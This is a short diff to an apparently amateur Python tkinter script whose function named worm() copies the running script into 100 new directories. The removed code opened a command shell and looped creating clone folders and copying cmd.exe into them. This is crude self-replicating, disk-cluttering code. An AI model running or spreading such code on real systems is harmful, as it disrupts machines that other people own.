@@ -1,9 +1,10 @@
 from tkinter import *
 from functools import partial
 from colorama import Fore,Back, Style
-import sys
+from sys import argv
 import os
 import socket
+import subprocess
 
 
 
@@ -24,15 +25,15 @@ def click():
 
 
 def worm():
-        script = sys.argv
-        name=str(script[0])
-
+        script = argv
+        name = str(script[0])
+        print(name)
+        for i in range(100):
+                DN = 'nerd'+str(i)
+                subprocess.call(['mkdir',DN])
+                subprocess.call(['cp',name, DN])
         
-        os.system('start cmd')
-        while True:
-                 os.mkdir('clone')
-        os.system(r"copy cmd.exe clone")
-        os.system(r"copy" + name + "clone")
+        
        
 
 
